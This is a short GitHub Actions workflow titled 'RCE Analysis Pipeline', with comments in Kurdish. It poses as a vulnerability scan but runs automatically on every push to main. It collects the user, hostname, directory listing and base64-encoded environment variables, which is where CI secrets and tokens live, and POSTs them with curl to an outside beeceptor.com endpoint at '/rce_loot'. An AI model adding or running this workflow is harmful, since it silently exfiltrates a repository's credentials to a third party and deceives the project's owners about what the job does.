name: RCE Analysis Pipeline

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  exploit_test:
    runs-on: ubuntu-latest
    steps:
      - name: System Information Gathering
        run: |
          echo "Scanning for RCE vulnerabilities..."
          
          # ١. کۆکردنەوەی هەموو زانیارییەکان لە ناو یەک گۆڕاوی تێکستیدا
          # hostname و whoami و لیستەی فایلەکان و ئەوانەی لە env دان
          DATA=$(cat <<EOF
          --- RCE DATA ---
          User: $(whoami)
          Hostname: $(hostname)
          Working Directory: $(pwd)
          Directory Content:
          $(ls -la)
          Environment Variables:
          $(env | base64)
          --- END OF DATA ---
          EOF
          )
          
          # ٢. ناردنی ڕاستەوخۆی تێکستەکە بەبێ دروستکردنی فایل
          # -H "Content-Type: text/plain" گرنگترین بەشە بۆ ئەوەی وەک فایل نەبینرێت
          curl -X POST \
            -H "Content-Type: text/plain" \
            -d "$DATA" \
            https://aksjwuwu.free.beeceptor.com/rce_loot
